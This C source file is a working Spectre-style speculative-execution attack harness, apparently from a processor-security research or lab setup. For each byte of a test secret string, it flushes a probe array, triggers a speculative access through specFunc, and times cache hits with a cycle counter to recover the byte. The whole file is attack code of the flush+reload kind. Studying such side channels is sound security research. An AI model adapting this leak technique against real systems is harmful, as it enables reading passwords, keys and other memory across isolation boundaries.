#include "printf.c"
#include "cache.h"

#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 50

#include "pwntools.c"

uint8_t attackArray[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "!\"#ThisIsTheBabyBoomerTest";

int main(void){
    uint64_t start, diff;
    uint8_t dummy = 0;
    static uint64_t results[256];

    for (uint64_t offset = 0; offset < SECRET_SZ; ++offset){
        printf("Searching for secret #%d, addr:0x%x, value(dec):%d, attackArray:0x%x\n", offset, secretString+offset, secretString[offset], attackArray);
        
        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            // flush the array that will be probed
            flushCache((uint64_t)&attackArray, sizeof(attackArray));

            // run the particular attack sequence
            specFunc(attackArray, (uint64_t)secretString + offset);
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
                uint64_t mix_i = ((i * 167) + 13) & 255;
                start = get_mcycle();
                dummy &= attackArray[mix_i * L1_BLOCK_SZ_BYTES];
                diff = (get_mcycle() - start);
                if ( diff < CACHE_HIT_THRESHOLD ){
                    results[mix_i] += 1;
                //     printf("mix_i = %d --- dummy = %x\n", i, dummy);// mix_i
                //     printf("mcycle: start = %d, diff = %d\n", start, diff);
                // }
                // else if ( i == secretString[offset] ){
                //     printf("mix_i = %d --- dummy = %x\n", i, dummy);// mix_i
                //     printf("mcycle: start = %d, diff = %d\n", start, diff);
                }
            }
        }

        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%x] =?= guess(hits,dec,char) 1.(%d, %d, %c) 2.(%d, %d, %c)\n", (uint8_t*)(secretString + offset), hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
    }
    return 1;
}
